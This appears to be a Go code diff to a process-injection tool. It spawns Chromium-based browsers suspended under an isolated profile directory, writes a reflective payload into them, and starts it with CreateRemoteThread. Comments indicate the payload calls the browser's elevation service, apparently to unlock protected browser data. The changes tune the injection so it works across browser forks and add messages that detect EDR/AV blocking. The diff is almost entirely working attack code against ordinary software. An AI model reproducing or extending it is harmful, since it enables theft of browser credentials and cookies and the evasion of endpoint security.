@@ -70,7 +70,9 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 
 	// Resume briefly so ntdll loader init completes before we hijack a thread; Bootstrap itself is
 	// self-contained but the later elevation_service COM call inside the payload relies on a
-	// fully-initialized PEB.
+	// fully-initialized PEB. Chrome's main() is left running so it can stand up its own COM/
+	// scheduler infrastructure — the child will show a normal browser window under the isolated
+	// --user-data-dir, which we accept; our Bootstrap finishes before the user sees anything.
 	_, _ = windows.ResumeThread(pi.Thread)
 	time.Sleep(500 * time.Millisecond)
 
@@ -132,19 +134,18 @@ func validateAndLocateLoader(payload []byte) (uint32, error) {
 }
 
 // buildIsolatedCommandLine builds the command-line for a spawned, singleton-isolated Chromium process.
-// Two upstream Chromium switches:
-//   - --user-data-dir=<temp>: escape the running browser's ProcessSingleton mutex so the suspended
-//     child survives past main() long enough for the remote Bootstrap thread to complete (issue #576).
-//   - --no-startup-window: suppress the brief UI splash that Edge/Brave/CocCoc paint despite
-//     STARTF_USESHOWWINDOW+SW_HIDE (which Chrome honors but brand-forked startup code often ignores).
-//
-// Adding other flags (--disable-extensions, --disable-gpu, ...) has destabilized Brave in the past
-// (payload dies inside DllMain with marker=0x0b); both switches here are upstream-official and safe.
+// Only --user-data-dir=<temp> is passed — this is the one switch that matters: it escapes the running
+// browser's ProcessSingleton mutex so the suspended child survives past main() long enough for the
+// remote Bootstrap thread to complete (issue #576). Adding any other flags (--no-startup-window,
+// --disable-extensions, --disable-gpu, ...) has either destabilized Brave (payload dies in DllMain
+// with marker=0x0b) or made newer Chromium forks on Windows 11 exit within ~200ms because they had
+// "nothing to do" after bypassing window creation — letting the browser show a normal window under
+// the isolated UDD is the most compatible behavior across forks and Windows versions.
 func buildIsolatedCommandLine(exePath, udd string) string {
 	// %q would Go-escape backslashes (C:\foo → C:\\foo); Windows CommandLineToArgvW then keeps them
 	// as literal double backslashes in argv. Raw literal quotes match Windows command-line rules.
 	//nolint:gocritic // sprintfQuotedString: %q is wrong for Windows command-line escaping, see above.
-	return fmt.Sprintf(`"%s" --user-data-dir="%s" --no-startup-window`, exePath, udd)
+	return fmt.Sprintf(`"%s" --user-data-dir="%s"`, exePath, udd)
 }
 
 // spawnSuspended launches exePath in a fully isolated suspended state. A unique --user-data-dir is
@@ -169,19 +170,12 @@ func spawnSuspended(exePath string) (*windows.ProcessInformation, string, error)
 		_ = os.RemoveAll(udd)
 		return nil, "", fmt.Errorf("injector: exe path: %w", err)
 	}
-	// STARTF_USESHOWWINDOW + SW_HIDE asks the child to honor our ShowWindow value on its first
-	// CreateWindow/ShowWindow call — a standard way to suppress the brief Chrome splash window that
-	// otherwise flashes because the UDD bypass makes the injected process proceed to the "I am the
-	// primary instance" branch and start painting UI before we TerminateProcess it.
-	si := &windows.StartupInfo{
-		Flags:      windows.STARTF_USESHOWWINDOW,
-		ShowWindow: windows.SW_HIDE,
-	}
+	si := &windows.StartupInfo{}
 	pi := &windows.ProcessInformation{}
 	err = windows.CreateProcess(
 		exePtr, cmdPtr, nil, nil,
 		false,
-		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
+		windows.CREATE_SUSPENDED,
 		nil, nil, si, pi,
 	)
 	if err != nil {
@@ -211,10 +205,24 @@ func writeRemotePayload(proc windows.Handle, payload []byte) (uintptr, error) {
 	return remoteBase, nil
 }
 
+// stillActive is the Windows STILL_ACTIVE exit code. GetExitCodeProcess returns this while the
+// process is still running; any other value means the process has already terminated.
+const stillActive uint32 = 259
+
 func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
 	entry := remoteBase + uintptr(loaderRVA)
 	hThread, err := winapi.CreateRemoteThread(proc, entry, 0)
 	if err != nil {
+		// Diagnostic: distinguish a dead target (Chrome self-exited before we could inject — policy,
+		// version, UDD-restriction, sandbox-init failure) from a live target whose NtCreateThreadEx
+		// was blocked by an EDR/AV hook. The remediation is very different in each case.
+		var exitCode uint32
+		if gecErr := windows.GetExitCodeProcess(proc, &exitCode); gecErr == nil {
+			if exitCode == stillActive {
+				return fmt.Errorf("injector: %w (target alive; likely EDR/AV blocking remote-thread injection)", err)
+			}
+			return fmt.Errorf("injector: %w (target exited with code 0x%x before injection)", err, exitCode)
+		}
 		return fmt.Errorf("injector: %w", err)
 	}
 	defer windows.CloseHandle(hThread)
